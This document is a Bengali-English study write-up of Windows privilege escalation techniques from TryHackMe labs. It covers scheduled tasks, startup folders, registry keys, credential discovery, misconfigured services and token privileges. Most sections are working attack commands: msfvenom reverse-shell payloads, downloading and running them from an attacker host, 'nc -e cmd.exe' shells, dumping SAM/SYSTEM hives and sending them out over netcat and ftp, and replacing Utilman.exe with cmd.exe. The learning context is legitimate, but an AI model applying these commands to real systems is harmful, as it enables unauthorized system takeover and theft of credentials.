# **************************Windows Privilege Escalation via Schedule Task**************************

### Thm room link:  [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)

📝 Windows Scheduled Task (Task Scheduler) – সংক্ষিপ্ত নোট

Scheduled Task হলো Windows-এর একটি ফিচার, যা ব্যবহার করে নির্দিষ্ট সময়, ইভেন্ট বা শর্ত অনুযায়ী স্বয়ংক্রিয়ভাবে কোনো প্রোগ্রাম, স্ক্রিপ্ট বা কমান্ড চালানো যায়।

🔹 উদাহরণ:

* নির্দিষ্ট সময়ে ব্যাকআপ নেওয়া
* লগইন হলে স্ক্রিপ্ট রান করা
* সিস্টেম আপডেট চেক করা

👉 এটি মূলত Task Scheduler টুলের মাধ্যমে পরিচালিত হয়।


📊 Scheduled Task vs Windows Services

| বিষয়                  | Scheduled Task (টাস্ক স্কেজুলার)              | Windows Services (সার্ভিস)                  |
|-----------------------|-----------------------------------------------|---------------------------------------------|
| কাজের ধরণ            | নির্দিষ্ট সময়/ইভেন্টে রান হয়                 | সবসময় বা ব্যাকগ্রাউন্ডে চলতে থাকে          |
| চালু হওয়ার সময়       | ট্রিগার (time, event, condition) ভিত্তিক     | সিস্টেম বুট হলে বা ম্যানুয়ালি স্টার্ট হয়   |
| রান হওয়ার সময়কাল     | নির্দিষ্ট কাজ শেষে বন্ধ হয়ে যায়              | ক্রমাগত (continuous) রান করে               |
| ব্যবহারের উদাহরণ     | ব্যাকআপ, স্ক্রিপ্ট, আপডেট                    | antivirus, database, web server            |
| কনফিগারেশন টুল      | Task Scheduler                               | Services Manager (services.msc)            |
| ইউজার নির্ভরতা       | নির্দিষ্ট ইউজার বা সিস্টেম হিসেবে রান হতে পারে| সাধারণত system-level এ চলে                |
| রিসোর্স ব্যবহার      | কম (only when triggered)                     | বেশি (কারণ সবসময় রান করে)                |
| ফ্লেক্সিবিলিটি       | বেশি (custom trigger & condition)            | কম (always running)                        |



## Technique_1 : Find Schedule Tasks using **SCHTASKS** 
### cmd_1: Default table format
```
schtasks /fo LIST  
```
### cmd_2: Show all the taskname 
```
schtasks /fo LIST | findstr /I taskname
```
* here /I --> is igname lowercase/upercase of taskname

### cmd_3: Showing only our needed taskname [vulnerable]
```
schtasks /fo LIST | findstr /I taskname | findstr /I /V microsoft
```
* It ignore the taskname where microsoft.. Suppose here get a taskname **\Savecred** which maybe vulnerable.

### cmd_4: get all info of this schedule task **Savecred**
```
schtasks /tn Savecred /fo list /v 
```
* here the schedule task Savecred running the file **"C:\PrivEsc\savecred.bat"**

### cmd_5: get info of this file **"C:\PrivEsc\savecred.bat"**
```
type C:\PrivEsc\savecred.bat
```
* Here admin username, password , how to get admin shell is given

### cmd_6: get admin shell
```
runas /user:admin cmd.exe
```
* Enter pass: password123 and get admin shell








## Technique_2: Search for Looking suspicious 
### cmd_1: Go to DevTools [looking suspicious] and show it's files
```
cd DevTools
dir
```
* here has a CleanUp.ps1 powershell file
### cmd_2: get info of this file
```
type CleanUp.ps1
```
* It clean up logs every min like schedule task [Remove-Item C:\DevTools\*.log]

### Check this file privilege using icacls [recommended]
```
icacls CleanUp.ps1
```
* output:

```
BUILTIN\Users: (M)
NT AUTHORITY\SYSTEM: (F)
BUILTIN\Administrators: (F)
WIN-QB...\Administrators: (F)
NT AUTHORITY\SYSTEM: (I)(F)
BUILTIN\Administrators: (I)(F)
BUILTIN\Users: (I)(RX)
```

* Here (M) means --> modified(read,write,exe..)
* (F) means --> Full Access(read,write,exe and also change file permission)
* (I) means --> Inherited(folder where is in the file)

### Check this file privilege using accesschx.exe
```
C:\PrivEsc\accesschk.exe -accepteula -quv user CleanUp.ps1
```
* -accepteula means accept aggrement.. -q means quit banner, u means shows permission for the given username [user], v means also show execute
* It check only my user's permission for this file

### Check this file privilege using ECHO [easy and short]
```
echo hello > CleanUp.ps1
```
* If no error, then the file have write permission for this user

```
echo echo ^> C:\Users\user\test.txt > CleanUp.ps1
```
* If test.txt file is created then we can ensure that thae CleanUp.ps1 file run in every min / epecific time later..

```
type CleanUp.ps1
```
* output: echo > C:\Users\user\test.txt

```
dir C:\Users\user\
```
* Check the file is created or not ..Here it is created

### Now Create ReverseShell & get admin Access
website : revshells.com
IP : my_machine_tun0, PORT: 4444, 
OS: powershell#3(Base64)  [copy this code]

* Now create netcat listener to my kali on port 4444
```
nc -nvlp 4444
```
* append this copied code to CleapUp.ps1
```
echo copyed_code > CleanUp.ps1
```
* Now after a specific time when CleanUp.ps1 run it gives a reverse connection to my kali ..

##  🪟 Windows Startup Folder Privilege Escalation

**Startup Folder** হলো Windows-এর একটি বিশেষ ফোল্ডার, যেখানে রাখা যেকোনো প্রোগ্রাম বা স্ক্রিপ্ট ইউজার লগইন করার সাথে সাথে স্বয়ংক্রিয়ভাবে রান হয়।

### ⚠️ Privilege Escalation কীভাবে হয়?
যদি কোনো **low privilege user** এই Startup folder-এ **write permission** পায়, এবং এই ফোল্ডারটি কোনো **Administrator user** দ্বারা ব্যবহৃত হয়, তাহলে attacker সেখানে একটি malicious file রাখতে পারে।

👉 পরে যখন Admin লগইন করবে, সেই malicious file রান হবে  
👉 এবং attacker **Admin privilege** পেয়ে যাবে  

---

### 🛠️ সংক্ষেপে ধাপ:
1. Startup folder-এর permission চেক করা  
2. যদি write access থাকে → vulnerability  
3. malicious script (.bat/.exe) তৈরি করা  
4. Startup folder-এ রেখে দেওয়া  
5. Admin লগইনের অপেক্ষা  
6. Admin privilege পাওয়া  

---

### 💡 উদাহরণ:
```bat
net localgroup administrators attacker /add
```

### 👉 এই কমান্ড রান হলে attacker admin group-এ যুক্ত হয়ে যাবে


🔐 প্রতিরোধ:
* Startup folder-এ write permission সীমিত করা
* Proper ACL (Access Control) ব্যবহার করা
* Suspicious file monitor করা


## Solve the THM room

### **Run The windows machine**

```
xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.49.176.234 /smart-sizing

```

### **Go to startup folder**
```
cd "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

dir
```

### **Check the file write permission**
```
echo > test.txt 
```
##### if the file test.txt is created then the folder have write permission for your user

### **Now make a reverse shell of my kali linux machine**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe

python3 -m http.server 80

nc -nlvp 4444
```

### **Download / Add the malicious shell.exe fo the Startup folder**
```
certutil -urlcache -split -f http://kali_ip shell.exe shell.exe
```
#### Now it add the shell.exe file to the windows startup folder. When a user(administrator) login then the shell.exe if automatically run and give the reverse connection to the kali shell ..



# **WIndows Privilege Escalation via Registry**

📝 Windows Registry

Windows Registry হলো Windows অপারেটিং সিস্টেমের একটি কেন্দ্রীয় ডাটাবেজ, যেখানে সিস্টেম, হার্ডওয়্যার, সফটওয়্যার এবং ইউজার সেটিংস সংরক্ষিত থাকে।

🔹 সহজভাবে বুঝলে:

👉 Registry = Windows-এর “Configuration Storage”
👉 এখানে OS ও অ্যাপ্লিকেশন কীভাবে কাজ করবে তার তথ্য থাকে

📂 Registry Structure (গঠন)

Registry মূলত কয়েকটি Root Key (Hive) নিয়ে গঠিত:

* HKEY_LOCAL_MACHINE (HKLM) → সিস্টেম ও হার্ডওয়্যার সেটিংস
* HKEY_CURRENT_USER (HKCU) → বর্তমান ইউজারের সেটিংস
* HKEY_CLASSES_ROOT (HKCR) → ফাইল টাইপ ও অ্যাসোসিয়েশন
* HKEY_USERS (HKU) → সব ইউজারের সেটিংস
* HKEY_CURRENT_CONFIG (HKCC) → বর্তমান হার্ডওয়্যার কনফিগারেশন

⚙️ Registry ব্যবহার
* সফটওয়্যার কনফিগারেশন সংরক্ষণ
* Windows startup program নিয়ন্ত্রণ
* ইউজার preference (theme, settings)
* ডিভাইস ও ড্রাইভার তথ্য

🛠️ Registry Editor

👉 Registry edit করার জন্য টুল:
```
regedit

```
⚠️ গুরুত্বপূর্ণ সতর্কতা
* ভুলভাবে Registry পরিবর্তন করলে system crash হতে পারে
* edit করার আগে backup নেওয়া উচিত

### ==> Now show How Privilege escalate by Registry 
---
## **AlwaysInstallElevated Registry**
---

📝 AlwaysInstallElevated Registry – সংক্ষিপ্ত নোট (বাংলা)

AlwaysInstallElevated হলো একটি Registry setting, যা enable থাকলে .msi package install করার সময় automatic admin (elevated) privilege পায়।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Policies\Microsoft\Windows\Installer
HKLM\Software\Policies\Microsoft\Windows\Installer

```
👉 এখানে AlwaysInstallElevated = 1 হলে feature enable থাকে

⚙️ কীভাবে কাজ করে:

👉 User MSI file run করে → Windows check করে এই setting →
👉 Enable থাকলে → installer admin privilege নিয়ে run হয়

⚠️ Security Risk:
Normal user malicious .msi চালিয়ে admin access নিতে পারে
এটি একটি common Privilege Escalation vulnerability

### Check this registry for HKLM (Hive Key Local Machine)
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
DisableMSI                REG_DWORD  0x0  [flase]
``` 

### Check this registry for HKCU (Hive Key Current User)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
``` 

#### HKLM & HKCU outout should be like that then this technique is worked,otherwise not worked..

### Create a malicious shell.msi & run netcat listener on my kali machine

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi > shell.msi

python3 -m http.server 80

nc -nlvp 4444
```

### Now download and run the file in the windows
```
cd Desktop

curl http://my_kali_ip/shell.msi    [download]

msiexec /quiet /i shell.msi        [run]
```

#### when the file is run , get the reverse shell connection to my kali machine & get the system user 


---
## **Run Registry**
---
📝 Run & Autorun Registry – সংক্ষিপ্ত নোট (বাংলা)
Run Registry Key হলো এমন জায়গা যেখানে program path রাখা হয়, যা login বা startup-এ automatically run হয়

📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
* HKCU → শুধু current user
* HKLM → সব user

⚙️ কীভাবে কাজ করে:

👉 System start / login → Registry check → Program auto run

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Run
```

#### Output
```
My Program REG_SZ "c:\Program Files\Autorun Program\Program.exe"
```
### Go to this folder and check the file permission 
```
cd "c:\Program Files\Autorun Program"
dir
echo > program.exe      [gives no error.Write permission of this file]
echo > test.exe         [Access is denied..Can't create any file to this folder]
```

#### Now I should not delete the program.exe and make a new file program.exe which is malicious

### Now append the shell.exe [created for the AlwaysInstallElevated Registry ] to this program.exe
```
curl http://my_kali_ip/shell.exe -o program.exe
```

#### ==> Now when a user(admin) is login,then program.exe file is run automatically & give the reverse connection shell to my kali machine [running nc listener]



---
## **RunOnce Registry**
---
📝 RunOnce Registry – সংক্ষিপ্ত নোট (বাংলা)

RunOnce Registry Key এমন একটি key যেখানে রাখা program/script শুধু একবার run হয়, সাধারণত next login বা system startup-এ।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
* HKCU → current user-এর জন্য
* HKLM → সব user-এর জন্য

⚙️ কীভাবে কাজ করে:
👉 System start / login → RunOnce key check → program run → entry automatically delete হয়ে যায়

⚠️ Security:
Malware একবার execution বা setup task চালাতে ব্যবহার করতে পারে

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce
```
#### output: nothing is shown [no files]

### Now try to add a new registry
```
reg add HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce /V shell /t REG_SZ /d "c:\Program Files\Autorun Program\Program.exe" /f
```

#### Output: Error[access is denied]
#### Here REG_SZ means string type registry

#### If there have access then when a user(admin) login it automatically run the "c:\Program Files\Autorun Program\Program.exe" and then get the reverse shell to my kali machine & then it will remove this "c:\Program Files\Autorun Program\Program.exe" file..


# **WIndows Privilege Escalation via Credential Discovery**

## Try to find credentials from Registries

```
reg query HKLM /f password /t REG_SZ /s
```
* /f --> find, -t --> type = string ..It searches password in Local Machine. Here you may get the important credentials

```
reg query "HKLM\Software\Microsoft\Windows NT\Current Version\winlogon"
```
* winlogon is a important registry. We should check it out. We can get important credentials here.

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```
* output: HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42
```
* Here you may get another user(admin) credentials who used his username and password for login via ssh or proxy server etc..


## Try to find credentials using cmdkey (Windows Credential Manager) 

cmdkey হলো Windows-এর একটি command-line tool, যা ব্যবহার করে Credential Manager-এ username ও password (credentials) save, view, delete করা যায়।

🔹 কী কাজ করে?

👉 বিভিন্ন service (RDP, network share ইত্যাদি) access করার জন্য credentials store করে
👉 বারবার password না দিয়ে auto login সম্ভব হয়

⚙️ Common Commands:
```
cmdkey /list        → সব saved credentials দেখায়
cmdkey /add         → নতুন credential যোগ করে
cmdkey /delete      → credential delete করে
```
👉 system-এ stored credentials দেখা যাবে
⚠️ Security:
* Stored credential misuse হলে unauthorized access হতে পারে
* attacker saved credential ব্যবহার করে lateral movement করতে পারে

💡 উদাহরণ:
```
cmdkey /list
```
* Shows the credentials . Here it may show admin username but is don't show it's pass. Because pass is encrypted . Suppose , Here admin credentials is saved, but pass is not shown . Now we can use some technique for privilege escalation. 

```
runas /savecred /user:admin cmd.exe
```
* runas--> like sudo, /savecred--> don't need pass.
* It run a new cmd as admin user

```
runas /savecred /user:admin reverse.exe
```
* Here we can also use reverse_shell which is created by msfvenom and netcal listener is open ..



## Try to find credentials using SAM & SYSTEM

🔹 SAM (Security Account Manager)

SAM হলো Windows-এর একটি database, যেখানে local user account ও password (hashed form) সংরক্ষিত থাকে।
📂 Location: C:\Windows\System32\config\SAMC:\Windows\System32\config\SAM

⚙️ কী থাকে:
* Usernames
* Password hashes
* Group information

⚠️ Security:
* Directly readable না (locked থাকে)
* কিন্তু dump করলে password hash পাওয়া যায়

🔹 SYSTEM

SYSTEM file হলো Registry hive, যেখানে system configuration ও encryption key থাকে।
📂 Location: C:\Windows\System32\config\SYSTEM

⚙️ কী কাজ:
* Boot configuration
* System settings
* SAM hash decrypt করার key (boot key) store করে

🔗 SAM + SYSTEM সম্পর্ক
👉 SAM-এ password hash encrypted থাকে
👉 SYSTEM file-এর key দিয়ে সেই hash decrypt করা যায়

⚠️ Security Risk:
* SAM + SYSTEM access পেলে attacker password hash extract করতে পারে
* এরপর password crack বা pass-the-hash attack সম্ভব

```
copy C:\Windows\System32\config\SAM
```
* checking if SAM file have read/copy permission for my user. Most probably you don't get the permission. But some times , admin/other user saved the SAM & SYSTEM file in another folder. If we check all the folder's info , we may get SAM & SYSTEM file. In this lab , we get this in "C:\Windows\Repair" folder
```
cd C:\Windows\Repair
copy SAM C:\Users\user
```
* checking it's read permission for my user.And I have the permission. And the SAM file is encrypted, SYSTEM file is used to decrypt it..

* Now try to transfer these two files in my kali linux using ftp server
```
kali: python3 -m pyftplib --write --port 21
```
* now from windows connect to kali using ftp
```
ftp kali_ip
```
* username: anonymous , password: ...... Connected as anonymous user.
```
binary
```
* for transter in binary mode
```
put SAM
put SYSTEM
```
* It upload the files and it will saved in my kali automatically

Now In my kali decrypt the Files
```
kali: impacket-secretsdump LOCAL -system SYSTEM -sam SAM
```
* Decrypt these files and here you may get some credentials but in hash form(pass)
* You can unhash using john the ripper and websites or you can directly use the hashes for login 





## Try to find credentials from History

ROOM LINK : [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

==>For this room, Get the windows use **Remmina** . It's give a GUI for RDP (remote) login to windows

* In general, cmd is not store the command history . But powershell is store command history. Now  check powershell command history..

```
type C:\Users\your_user\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost-history.txt
```

* Powershell history is generated differently for different users.
* Here in history, you may get some important credentials.


## Try to find credentials from config files
* Important config files 

Unattend.xml হলো Windows setup-এর একটি configuration file, যা ব্যবহার করে automated (unattended) installation করা হয়—মানে user input ছাড়াই Windows install করা যায়।
📂 Location: C:\Windows\Panther\Unattend.xml

⚙️ কী থাকে এই ফাইলে:
* Administrator username
* Password (কখনও plain text বা encoded)
* Computer name
* Time zone, language settings
* Installation configuration

💡 কীভাবে কাজ করে:
👉 Windows install-এর সময় এই file read করে
👉 Automatically সব setup process complete করে

⚠️ Security Risk:
* এখানে sensitive info (username/password) থাকতে পারে
* Misconfigured হলে attacker credential পেতে পারে
* Privilege Escalation-এর জন্য useful হতে পারে

#### checking info of this Unattend.xml file
```
type C:\Windows\Panther\Unattend.xml
```

* Another important config file 

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config হলো .NET Framework-এর একটি গুরুত্বপূর্ণ configuration file, যা ASP.NET web application বা .NET runtime settings নিয়ন্ত্রণ করে।
📂 Location: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config  [version is changeable]

⚙️ কী কাজ করে:
* ASP.NET application settings কনফিগার করে
* Security, authentication ও authorization rules define করে
* Database connection settings রাখতে পারে
* Runtime behavior control করে

💡 কী থাকে:
* Connection strings (database info)
* App settings (key-value configuration)
* Security policies
* Module & handler configuration

⚠️ Security Risk:
* Sensitive data (DB credentials, API keys) থাকতে পারে
* Misconfiguration হলে information leakage হতে পারে
* Web application attack surface বাড়ায়

#### checking info of this web.config file
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config
```
* Here have a chance to get database username and password..


# **WIndows Privilege Escalation via Misconfigured Services**

📝 Windows Services – সংক্ষিপ্ত নোট (বাংলা)

Windows Service হলো এমন একটি program/process যা background-এ continuously run করে, সাধারণত user interaction ছাড়াই।

⚙️ কী কাজ করে:
* System boot হলে automatically start হতে পারে
* OS ও application-এর গুরুত্বপূর্ণ কাজ handle করে
* যেমন: Antivirus, Database, Web Server

🛠️ Management Tool: **services.msc**

✅ সংক্ষেপে:

👉 Service = background process
👉 সবসময় বা দীর্ঘ সময় ধরে run করে

⚠️ Misconfigured Services – সংক্ষিপ্ত নোট

Misconfigured Service হলো এমন service যার configuration ভুলভাবে সেট করা, ফলে attacker সেটিকে exploit করতে পারে।


🔹 Common Misconfigurations:
* Service file/folder-এ weak permission (write access)
* Unquoted service path (space থাকলে vulnerability)
* Service executable replace করা সম্ভব
* Low privilege user service modify করতে পারে

💥 কীভাবে exploit হয়:

👉 Attacker service file modify/replace করে
👉 Service restart হলে malicious code run হয়
👉 Admin/System privilege পাওয়া যায়

⚠️ Risk:
* Privilege Escalation
* System compromise

==> Here I will use cmd and powershel for this privilege escalation

* Find Services:
```
cmd   : sc query
power : Get-CimInstance Win32_Service
```
It shows all services. In cmd modification is difficult. So, I have to use powershell for filter the command for getting specific services

```
power : Get-CimInstance Win32_Service | Where-Object PathName -notmatch 'Windows' | Select Name,PathName
```
* -notmatch --> for not showing windows services, Select Name,PathName --> only shows outservice's Name and PathName
* output: 
```
Name           PathName
----           --------
AmazonSSMAgent "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
AWSLiteAgent   C:\Program Files\Amazon\XenTools\LiteAgent.exe
daclsvc        "C:\Program Files\DACL Service\daclservice.exe"
dllsvc         "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
filepermsvc    "C:\Program Files\File Permissions Service\filepermservice.exe"
LSM
NetSetupSvc
regsvc         "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
winexesvc      winexesvc.exe

```

* Create a payload in my kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.181.155 LPORT=4444 -f exe -o shell.exe

python -m http.server 80     [run python server]

nc -nvlp 4444                [run netcat listener in another terminal on port 4444]
```

* Download the shell.exe to windows using powershell
```
wget http://192.168.181.155/shell.exe -OutFile shell.exe   [wget works in only powershell]
```

### 1st_technique: Insecure Service Permission (service info bin path can be changed)

* Check the service(daclsvc) configuration using cmd
```
sc qc daclsvc
```
output:
```
START_TIME : Demand-start [manually]   /  automatically
Binary_PATH_NAME:  "C:\Program Files\DACL Service\daclservice.exe"
Service-Start-Name: Local System   [the service run as local system]
```
* Now try to change this service binary path 
```
sc config daclsvc binpath = "C:\Users\user\shell.exe"
```
==> If successful then this service will run shell.exe when start

```
sc start daclsvc
```
* Start the service and it will run shell.exe and I will get the reverse shell in my kali linux via netcal listener.



#### 2nd_technique: Insecure service Executables

* Now try for another service named filepermsvc where I can't change the info [no insecure service permission], but I can overwrite the file [Insecure service Executables]

```
sc qc filepermsvc    [check the info of this service]

copy shell.exe "C:\Program Files\File Permission Service\filepermservice.exe" /Y
```
* overwrite shell.exe to "C:\Program Files\File Permission Service\filepermservice.exe" ... Here /Y means --> overwrite permission "YES"

```
sc start filepermsvc
```

* Now start the service and gete the reverse_shell to my kali ...



### 3rd_technique: Unquoted service path

* here in these services there was a service named unquotedsvc which pathname is not quoted..
* Now know about how windows check the file where quote is not given 
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
* In general a normal user don't have write permission in C or Program Files (upper level folder). But it may have write permission in Unquoted Path Service folder.(low level folder)

```
copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
==> If successful then start the service and get reverse shell on my kali as nt-authority user

```
sc start unquotedsvc
```


### 4th_technique: Manually change in reg 

* sc command is like the frontend of the registry(database). It fetch,edit,update,delete data from registries. We also manually change the registry which I had done before by sc command.

* check all info of regsvc service

```
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

sc qc regsvc     [this two command shows almost same result]
```

* Now change the ImagePath of regsvc 

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /V ImagePath /t REG_EXPAND_SZ /d C:\Users\user\shell.exe /f
```

==> /t REG_EXPAND_SZ (type expandable string) .. ImagePath is same as BINARY_PATH_NAME which shows by sc command

```
sc qc regsvc
```

==> Now, you here see that BINARY_PATH_NAME is updated as the given ImagePath by updating the reg. Now simply run this service and get reverse shell in kali

```
sc start regsvc
```



# **WIndows Privilege Escalation via User Privileges**

ROOM: windows privilege escalation [task 6]

cmd run as administrator to show all the privilege
```
whoami /priv 
```
* It shows all the privilege of the user

* output: 

```
    privilege name          description            state   
* SeBackUpPrivilege           .....               Disabled
* SeRestorePrivilege          .....               Disabled
SeShutdownPrivilege           .....               Disabled
------------
------------
```

## SeBackUpPrivilege

==> If a user have this privilege, then he can read any file of the system. Now privilege escalate using this vector by SAM & SYSTEM file

```
cd C:\Users\thmbackup\
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
```

==> Now transfer these two file in kali & privilege escalate by previous method [credential discovery]

==> Now learn abount another transfer method: using netcat

step_1: download netcat.exe in kali "github.com/int0x33/nc.exe/bolb/master/nc64.exe" & then transfer to windows by powershell 

```
kali: mv nc64.exe nc.exe
kali: python3 -m http.server 80

power: Invoke_WebRequest -uri http://kali_tun0_ip/nc.exe -OutFile nc.exe
power: .\nc.exe -h
```

* Now transfer the data from windows to kali using nc 

```
cmd:  nc kali_ip 4444 < SAM                     kali: nc -nvlp 4444 > SAM
cmd:  nc kali_ip 4444 < SYSTEM                  kali: nc -nvlp 4444 > SYSTEM
```




## SeRestorePrivilege 

==> If a user have this  privilege , then he can write any file of the system. Now change the ImagePath in the reg & start the process & get reverse shell as previous technique via misconfigured services



**"" Now login as another user thmtakeownership who have SeTakeOwnershipPrivillege ""**


## SeTakeOwnershipPrivillege

==> he can change all the files ownership. Now he can change the file owner and make himself owner & then get the permission for read,write,overwrite the file. Now privilege escalate by Utilman.exe 

==> Utilman.exe (Utility Manager) হলো Windows-এর একটি system program, যা Ease of Access tools (accessibility features) চালানোর জন্য ব্যবহৃত হয়।
📂 Location: C:\Windows\System32\utilman.exe

⚙️ কী কাজ করে:
* Login screen থেকেও access করা যায়
* Accessibility tools চালায়, যেমন:
* * Narrator
* * Magnifier
* * On-Screen Keyboard

👉 Shortcut:Windows + U

⚠️ Security Perspective:
* Login screen-এ run হয় → SYSTEM privilege থাকে
* যদি replace করা যায় (e.g., cmd.exe দিয়ে), তাহলে Login screen থেকেই command prompt open করা যায়

💥 Attack Concept:

👉 utilman.exe replace → cmd.exe
👉 Login screen-এ Ease of Access চাপলে → cmd খুলবে
👉 SYSTEM privilege পাওয়া সম্ভব


* Make owner of thmtakeownership 

```
icacls C:\Windows\System32\Utilman.exe /grant thmtakeownership:F
```
* overwrite cmd.exe --> Utilman.exe

```
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```


## SeAssignPrimaryTokenPrivilege & SeImpersonatePrivilege

🔹 SeAssignPrimaryTokenPrivilege

👉 এই privilege থাকলে একটি process অন্য user-এর token assign করতে পারে (primary token change করা যায়)

⚙️ কী কাজ করে:
* নতুন process চালানোর সময় অন্য user-এর identity ব্যবহার করা
* সাধারণত service বা system-level process-এ থাকে
⚠️ Security:
* attacker এই privilege ব্যবহার করে উচ্চ privilege user-এর token দিয়ে process চালাতে পারে
* Privilege Escalation সম্ভব

🔹 SeImpersonatePrivilege

👉 এই privilege থাকলে একটি process অন্য user হিসেবে temporarily act (impersonate) করতে পারে

⚙️ কী কাজ করে:
* client request handle করার সময় user-এর identity ব্যবহার করা
* service account-এ সাধারণত থাকে
⚠️ Security:
* attacker এই privilege exploit করে (e.g., token impersonation attack)
* SYSTEM বা admin access পাওয়া সম্ভব

🔗 পার্থক্য (Short):
| বিষয়    | SeAssignPrimaryTokenPrivilege     | SeImpersonatePrivilege             |
| ------- | --------------------------------- | ---------------------------------- |
| কাজ     | অন্য user-এর primary token assign | অন্য user হিসেবে act (impersonate) |
| ব্যবহার | process create/change             | request handle / temporary use     |
| ঝুঁকি   | privilege escalation              | privilege escalation (common)      |

==> For solve this problem we have to browse http:/thm_ip

```
whoami /priv                   [kali: python3 -m http.server 80 {kali}]
curl http://kali_ip/nc.exe -o C:\Users\Public\nc.exe
curl http://kali_ip/nc.exe -o C:\Users\Public\ps.exe
C:\Users\Public\ps.exe -c "C:\Users\Public\nc.exe -e cmd.exe kali_ip 4445"
nc -nvlp 4445    [kali]
```

==> Get reverse shell of nt-authority user.

==> PrintSpoofer64.exe[ps.exe] একটি tool, যা Windows-এর SeImpersonatePrivilege exploit করে SYSTEM privilege পাওয়ার জন্য ব্যবহার করা হয়।

⚙️ মূল ধারণা (Core Idea)

👉 Windows-এর Print Spooler service ব্যবহার করে
👉 attacker নিজের process-কে SYSTEM user হিসেবে impersonate করায়


🔄 কীভাবে কাজ করে (Flow)
1. Attacker-এর কাছে আগে থেকেই SeImpersonatePrivilege থাকতে হবে
2. PrintSpoofer একটি named pipe তৈরি করে
3. Print Spooler service-কে trick করে ওই pipe-এ connect করায়
4. যখন SYSTEM process connect করে → attacker সেই token capture করে
5. এরপর সেই token দিয়ে নতুন process run করে

👉 Result:
SYSTEM privilege shell পাওয়া যায়

💡 সহজভাবে:
👉 “SYSTEM process কে trick করে → তার identity copy করা”

⚠️ কেন কাজ করে?
* Windows service (Print Spooler) high privilege (SYSTEM) দিয়ে চলে
* SeImpersonatePrivilege থাকলে সেই identity steal করা যায়


🚨 Security Impact:
* Local Privilege Escalation
* Admin → SYSTEM access
* Full system compromise


#  **Windows Privilege Escalation via Automated Enumuration**

### ==> There hava a software **winPEASany.exe** 
### ==> run **winPEASany.exe** 
### =====> redmark & main section should be visit correctly..
